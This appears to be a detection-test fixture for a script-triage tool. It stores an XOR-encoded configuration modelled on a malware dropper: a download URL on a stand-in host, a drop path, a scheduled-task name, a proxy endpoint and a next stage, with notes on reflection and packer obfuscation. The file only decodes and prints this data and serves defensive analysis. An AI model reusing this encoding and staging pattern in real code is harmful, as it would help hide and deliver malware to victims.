# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_28176380 = [83, 24, 23, 89, 86, 81, 64, 85, 86, 24, 85, 87, 74, 67, 76, 73, 64, 122, 77, 74, 86, 81, 9, 68, 70, 84, 80, 76, 87, 64, 122, 87, 64, 72, 74, 81, 64, 9, 65, 64, 70, 74, 65, 64, 122, 64, 72, 71, 64, 65, 65, 64, 65, 9, 82, 87, 76, 81, 64, 122, 67, 76, 73, 64, 9, 65, 76, 86, 85, 68, 81, 70, 77, 122, 85, 87, 74, 70, 64, 86, 86, 89, 68, 65, 68, 85, 81, 64, 87, 24, 70, 72, 65, 122, 85, 92, 81, 77, 74, 75, 122, 77, 68, 75, 65, 74, 67, 67, 89, 86, 81, 68, 66, 64, 122, 70, 74, 80, 75, 81, 24, 16, 89, 86, 92, 75, 81, 68, 93, 24, 65, 76, 70, 81, 76, 74, 75, 68, 87, 92, 122, 65, 76, 86, 85, 68, 81, 70, 77, 89, 74, 71, 67, 80, 86, 70, 68, 81, 76, 74, 75, 24, 87, 64, 67, 73, 64, 70, 81, 76, 83, 64, 122, 75, 68, 72, 64, 122, 85, 73, 68, 75, 89, 70, 68, 87, 87, 76, 64, 87, 24, 85, 92, 68, 87, 72, 74, 87, 122, 85, 92, 76, 75, 86, 81, 68, 73, 73, 64, 87, 89, 82, 76, 75, 65, 74, 82, 86, 122, 70, 77, 68, 76, 75, 24, 85, 74, 82, 64, 87, 86, 77, 64, 73, 73, 122, 81, 74, 122, 85, 92, 81, 77, 74, 75, 89, 70, 68, 72, 85, 68, 76, 66, 75, 122, 76, 65, 24, 70, 68, 72, 85, 68, 76, 66, 75, 8, 23, 21, 67, 21, 64, 18, 70, 65, 68, 70, 89, 80, 87, 73, 24, 77, 81, 81, 85, 86, 31, 10, 10, 23, 21, 67, 21, 64, 18, 70, 65, 68, 70, 11, 64, 93, 68, 72, 85, 73, 64, 11, 76, 75, 83, 68, 73, 76, 65, 10, 17, 18, 23, 20, 29, 19, 68, 22, 11, 85, 92, 89, 80, 86, 64, 87, 122, 68, 66, 64, 75, 81, 24, 109, 80, 75, 81, 87, 64, 86, 86, 117, 92, 81, 77, 74, 75, 10, 23, 21, 67, 21, 64, 18, 70, 65, 68, 70, 89, 67, 76, 73, 64, 122, 85, 68, 81, 77, 24, 102, 31, 10, 117, 87, 74, 66, 87, 68, 72, 97, 68, 81, 68, 10, 109, 80, 75, 81, 87, 64, 86, 86, 105, 68, 71, 10, 11, 80, 85, 65, 68, 81, 64, 8, 23, 21, 67, 21, 64, 18, 70, 65, 68, 70, 11, 85, 92, 89, 76, 75, 81, 64, 87, 85, 87, 64, 81, 64, 87, 122, 85, 68, 81, 77, 24, 102, 31, 10, 117, 87, 74, 66, 87, 68, 72, 97, 68, 81, 68, 10, 117, 92, 81, 77, 74, 75, 8, 23, 21, 67, 21, 64, 18, 70, 65, 68, 70, 10, 85, 92, 81, 77, 74, 75, 11, 64, 93, 64, 89, 81, 68, 86, 78, 122, 75, 68, 72, 64, 24, 118, 92, 86, 81, 64, 72, 112, 85, 65, 68, 81, 64, 8, 23, 21, 67, 21, 64, 18, 70, 65, 68, 70, 89, 85, 87, 74, 93, 92, 122, 64, 75, 65, 85, 74, 76, 75, 81, 24, 20, 23, 18, 11, 21, 11, 21, 11, 20, 31, 20, 29, 17, 22, 23, 89, 75, 64, 93, 81, 122, 86, 81, 68, 66, 64, 24, 73, 74, 70, 68, 73, 8, 65, 76, 86, 85, 68, 81, 70, 77, 11, 71, 68, 81, 89, 77, 68, 75, 65, 74, 67, 67, 122, 76, 65, 24, 117, 118, 117, 124, 8, 22, 23, 103, 16, 28, 16, 28, 99, 99, 16, 102, 100, 29, 22, 97, 21]
CODEC_28176380 = "integer_list|single_byte_xor|25"

def load_28176380():
    return bytes(MATERIAL_28176380)

def decode_28176380(stored_bytes):
    return bytes(value ^ 37 for value in stored_bytes)

def recover_28176380():
    harmless_value = (3, 5, 8, 13)[1:3]
    decode_state = "decode"
    while decode_state != "done":
        if decode_state == "decode":
            recovered_bytes = decode_28176380(load_28176380())
            decode_state = "done"
    configuration_text = recovered_bytes.decode("ascii", "strict")
    return configuration_text

def inspect_28176380():
    return recover_28176380()

def surface_28176380():
    routes = {"selected": lambda: ("dictionary_dispatch", "reflective_name_plan", "pyarmor_pyinstaller", "powershell_to_python")}
    return routes["selected"]()

def obfuscation_28176380():
    reflection_plan = ("__import__", "getattr", "reflective_name_plan")
    return reflection_plan[-1]

def plan_28176380():
    fields = dict(item.split("=", 1) for item in inspect_28176380().split("|"))
    analysis_surface = surface_28176380()
    obfuscation_surface = obfuscation_28176380()
    operation_plan = ("cmd_python_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_28176380())

# reconstruction complete